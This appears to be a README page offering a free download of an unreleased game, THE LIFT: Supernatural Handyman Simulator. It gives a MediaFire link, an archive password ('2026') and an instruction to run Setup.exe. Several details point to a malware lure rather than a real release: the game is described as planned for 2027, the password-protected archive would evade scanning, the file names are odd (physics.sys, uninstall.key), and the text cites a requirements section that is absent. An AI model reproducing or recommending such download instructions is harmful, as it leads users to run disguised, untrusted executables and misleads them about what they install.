## 🕹️ About

THE LIFT: Supernatural Handyman Simulator is a first-person sci-fi simulation adventure from Fantastic Signals, published by tinyBuild and planned for Windows in 2027. You play as a handyman restoring an abandoned research facility stranded in the void after a catastrophic incident. Repair furniture, rebuild electrical systems, craft useful tools, explore interconnected areas, and uncover the mystery behind the Institute's downfall. Its Soviet-inspired retrofuturist setting, supernatural atmosphere, interactive machinery, and narrative-driven exploration give routine renovation work an unsettling twist. This compact release uses more efficient archive compression to reduce the download size; the game itself is unchanged, with the same content and gameplay.

A strong fit for players who enjoy atmospheric first-person adventures, hands-on repair simulators, immersive worlds, and story-rich science fiction.

## ✨ Features

- 🔧 **Handyman Simulation** — Repair furniture, infrastructure, and strange machines throughout the Institute.
- 📖 **Mystery-Driven Story** — Piece together the truth behind the Institute's catastrophic incident.
- 🗺️ **Facility Exploration** — Explore a massive research complex with multiple areas, biomes, and hidden spaces.
- 🌌 **Retro-Futurist Atmosphere** — Experience an interactive world inspired by Soviet science fiction and the supernatural.
- 🧰 **Toolbox and Crafting** — Use unusual gadgets and recycled materials to solve restoration challenges.
- ⚡ **Electrical Engineering** — Build circuits, route cables, manage power, and restore complex systems.

### Step 1: Download

Download the compact archive from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the build expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- update_1.res <- Update resources
|-- driver.umap <- Driver data
|-- Password 2026.txt <- Password reminder (empty)
|-- driver.pak <- Driver archive
|-- uninstall.key <- Uninstall key
|-- res.pak <- Resources archive
|-- audio.res <- Audio resources
|-- global.cfg <- Global settings
|-- animations.dll <- Animation system
|-- settings.bin <- Configuration
|-- dlc.md5 <- DLC checksums
|-- physics.sys <- Physics engine
|-- bootstrap.wem <- Bootstrap audio
|-- scripts.lic <- Game scripts
|-- localization.ini <- Language files
|-- installer.dat <- Installer data
|-- update_1.ini <- Update config
|-- patch_1.bnk <- Audio banks
|-- license.wem <- Audio assets
|-- lang.sys <- Language system
|-- api.pak <- API modules
|-- assets.wem <- Asset audio
|-- license.bank <- License data
|-- launcher.dll <- Launcher library
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start

**Q: What should I do if extraction fails?**
**A:** Make sure you're using a recent version of your extractor and that the archive wasn't corrupted during download. If it fails, re-download the archive.

**Q: How often is the compact release updated?**
**A:** The archive is rebuilt whenever the source files change. Check the Releases page for updates.

**Q: How can I report a bug?**
**A:** Open an issue in the Issues tab with a clear description, your system specs, and steps to reproduce. Screenshots or logs help a lot.

**Q: Why is this release compact?**
**A:** The game files are packed using high-ratio compression to reduce the download size. The game itself is unchanged — it's the same content, just delivered in a smaller package.

**Q: What are the system requirements?**
**A:** The compact release targets the same hardware as the original game. See the System Requirements section above.

**Q: What compression format is used?**
**A:** The archive uses a standard compression format compatible with common extractors like 7-Zip, WinRAR, and WinZip.

**Q: Can I contribute?**
**A:** Yes. Contributions in the form of bug reports, feedback, and localization help are welcome. Open an issue or pull request to get started.
